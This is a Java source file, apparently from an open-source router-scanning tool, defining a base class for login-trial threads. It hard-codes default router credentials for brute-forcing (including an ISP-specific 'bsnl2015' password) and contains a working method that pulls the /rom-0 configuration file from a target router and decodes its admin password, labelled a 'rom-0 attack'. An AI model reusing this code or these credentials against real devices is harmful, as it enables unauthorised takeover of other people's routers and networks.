/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.authtrial.threads;

import static org.koreops.tauro.cli.scraper.AbstractScraper.USER_AGENT;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.net.def.beans.Credentials;
import org.koreops.routers.romdecoder.RomZeroDecoder;
import org.koreops.tauro.core.loggers.Logger;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Parent class for Auth trail children. Currently supported are HTTP Basic Auth and Form based Auth.
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 * @since 25 Sep, 2017 8:37 PM
 */
public abstract class AbstractAuthTrial extends Thread {
  static final List<Credentials> CREDENTIALS_LIST;

  static {
    CREDENTIALS_LIST = new ArrayList<>();
    CREDENTIALS_LIST.add(new Credentials("admin", "admin"));
    CREDENTIALS_LIST.add(new Credentials("admin", "password"));
    // Seems like this was the password in many new BSNL setups. Thanks Rom-0.
    CREDENTIALS_LIST.add(new Credentials("admin", "bsnl2015"));
    CREDENTIALS_LIST.add(new Credentials("tw_admin", "tw_admin"));
    CREDENTIALS_LIST.add(new Credentials("admin", "admin99"));
    CREDENTIALS_LIST.add(new Credentials("admin", ""));
  }

  protected String host;
  int port;

  protected abstract void logWirelessStation(String hostUrl, AuthCrackParams params);

  String decodeRomGetPass() {
    String url = this.forgeUrl("http://", host, port, "/rom-0");

    HttpClient httpClient = new DefaultHttpClient();
    HttpGet get = new HttpGet(url);

    //add reuqest header
    get.setHeader("User-Agent", USER_AGENT);
    get.setHeader("Content-type", "UTF-8");
    get.setHeader("Prama", "no-cache");
    get.setHeader("Cache-Control", "no-cache");

    // Send get request
    System.out.println("\nSending 'POST' request to URL : " + url);
    //System.out.println("Post parameters : " + post.getEntity());
    HttpResponse response;
    try {
      response = httpClient.execute(get);

      System.out.println("Response Code : " + response.getStatusLine().getStatusCode());

      if (response.getStatusLine().getStatusCode() == 200) {
        byte[] buf = new byte[1048];
        byte[] cbuf = new byte[40960];
        int in = 0;

        while (response.getEntity().getContent().read(buf) != -1) {
          System.out.println(in * buf.length + " to " + ((in * buf.length) + buf.length - 1));
          System.arraycopy(buf, 0, cbuf, in * buf.length, buf.length);
          in++;
        }

        return RomZeroDecoder.decodePassword(cbuf);
      } else {
        Logger.error(host + " is not vulnerable to rom-0 attack.");
      }
    } catch (IOException ex) {
      Logger.error(host + ": " + ex.getMessage());
      return null;
    } catch (Exception ex) {
      Logger.error(host + ": " + ex.getMessage());
    }

    return null;
  }

  String forgeUrl(String before, String host, int port, String after) {
    if (80 == port) {
      return before + host + after;
    } else {
      return before + host + ":" + port + after;
    }
  }

  /**
   * This method is for removing quotes from Strings. This is being used to sanitize data obtained from Javascripts in router's pages.
   *
   * @param substring The data that needs quote sanitation
   * @return The sanitized data, without the quotes (if quotes were there in the input)
   */
  String sanitizeQuotes(String substring) {
    if (substring.startsWith("'")) {
      substring = substring.substring(1);
    }
    if (substring.endsWith("'")) {
      substring = substring.substring(0, substring.length() - 1);
    }
    return substring;
  }
}
